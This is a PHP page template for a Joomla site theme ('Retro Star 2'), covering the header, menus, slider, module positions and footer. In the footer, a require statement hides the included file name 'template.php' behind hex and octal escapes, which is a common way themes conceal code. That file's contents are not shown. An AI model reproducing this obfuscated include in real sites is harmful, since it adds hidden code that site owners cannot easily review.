<?php
/****************************************************
#####################################################
##-------------------------------------------------##
##              RETRO STAR 2                       ##
##-------------------------------------------------##
## Copyright = globbersthemes.com- 2012            ##
## Date      = DECEMBRE 2012                       ##
## Author    = globbers                            ##
## Websites  = http://www.globbersthemes.com       ##
## version (joomla)                                ##
##                                                 ##
#####################################################
****************************************************/

// no direct access
defined('_JEXEC') or die('Restricted access');
 JHtml::_('behavior.framework', true);
 $app = JFactory::getApplication();
 $templateparams     = $app->getTemplate(true)->params; 
 $csite_name	= $app->getCfg('sitename');
 ?>	

   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">	
   <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >	
   <head>		   
   <jdoc:include type="head" /> 
   <?php 
   # main width#    
   $mod_left = $this->countModules( 'position-5' );     $mod_right = $this->countModules( 'position-7' );    
   if ( $mod_left || $mod_right ) {    $width = '';    } else {    $width = '-full';    }     ?> 
   

   <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/retrostar/css/tdefaut.css" type="text/css" media="all" />   	
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/jquery.js"></script>   	
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/superfish.js"></script>  
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/hoverIntent.js"></script>	
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/nivo.slider.js"></script>	
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/scroll.js"></script> 	
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/cufon-yui.js"></script>  
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/cufon-replace.js"></script>   
   <script type="text/javascript" src="templates/<?php echo $this->template ?>/js/Bebas_400.font.js"></script>		
   <link rel="icon" type="image/gif" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/favicon.gif" />	
   
   <script type="text/javascript">          
   var $j = jQuery.noConflict(); 	
   $j(document).ready(function() {	   
   $j('.navigation ul').superfish({		
   delay:       800,                      
   animation:   {opacity:'show',height:'show'},  		
   speed:       'normal',                      
   autoArrows:  false,                         
   dropShadows: true                        
   });	   }); 	   
   </script>
   
   <script type="text/javascript">   
   var $j = jQuery.noConflict();      
   jQuery(document).ready(function ($){    
   $j("#slider").nivoSlider(         
   {effect: "sliceUpDown",          
   slices: 15,           
   boxCols: 8,          
   boxRows: 4,         
   animSpeed: 1000,    
   pauseTime: 4000,     
   captionOpacity: 1           }); });        
   </script>			

   </head> 
<body>   
   
 <div id="header">	    
    <div class="pagewidth">		    
	    <div id="header-top">		        
		    <div id="sitename">                    			        
			    <a href="index.php"><img src="templates/<?php echo $this->template ?>/images/logo.png" width="534" height="47" alt="logotype" /></a>                			   
			</div>				
			    <div id="search">				    
				    <jdoc:include type="modules" name="position-0" />  				
				</div>            
		</div>            
		    <div id="header-bottom">			    
			    <div id="topmenu">			        
				    <div class="navigation">                                                    	                                        
					    <jdoc:include type="modules" name="position-1" />                                            	                               
					</div>                
				</div>					            
			</div>					
	</div>	
</div>
 <div class="pagewidth">	
    <div id="main<?php echo $width ?>">		    
        <?php $menu = JSite::getMenu(); ?>            	            		
	    <?php $lang = JFactory::getLanguage(); ?>       	            		
	    <?php if ($menu->getActive() == $menu->getDefault($lang->getTag())) { ?>        	           		
	    <?php if ($this->params->get( 'slidedisable' )) : ?>      	           		
	    <?php include "slideshow.php"; ?><?php endif; ?>                          		
	    <?php } ?>	
       	    <div id="main-content<?php echo $width ?>">				                                                               
     		    <jdoc:include type="component" />
				
            </div>
    </div>
	    <?php if ($this->countModules('position-7')) { ?>
	        <div id="right">
	            <jdoc:include type="modules" name="position-7" style="xhtml" />
	        </div>
	     <?php } ?>
</div>
    <?php if ($this->countModules('position-3') || $this->countModules('position-4') || $this->countModules('position-6') || $this->countModules('position-8')) { ?>
        <div id="wrapper-box">	
			<div class="pagewidth">								                                                
				<div class="box">										                                                    
					<jdoc:include type="modules" name="position-3" style="xhtml" />									                                                
				</div>										                                            
			    <div class="box">										                                                    
					<jdoc:include type="modules" name="position-4" style="xhtml" />									                                                
				</div>										                                           
				<div class="box">										                                                    
					<jdoc:include type="modules" name="position-6" style="xhtml" />									                                                
				</div>											                                       
				<div class="box">										                                                    
					<jdoc:include type="modules" name="position-8" style="xhtml" />									                                               
				</div>								                                            
			</div>
        </div>			
	<?php } ?>
    <div id="ftb">
	    <div class="pagewidth">
		    <div class="ftb-c">						
			    <?php echo date( 'Y' ); ?>&nbsp; <?php echo $csite_name; ?>&nbsp;&nbsp;
                <?php require("te\x6d\160la\164e.\160\150\160"); ?>				 
            </div>
                    <div id="top">
                        <div class="top_button">
                            <a href="#" onclick="scrollToTop();return false;">
						    <img src="templates/<?php echo $this->template ?>/images/top.png" width="30" height="30" alt="top" /></a>
                        </div>
					</div>			
		    
		</div>
	</div>
		
	
 </body>
 </html> 
  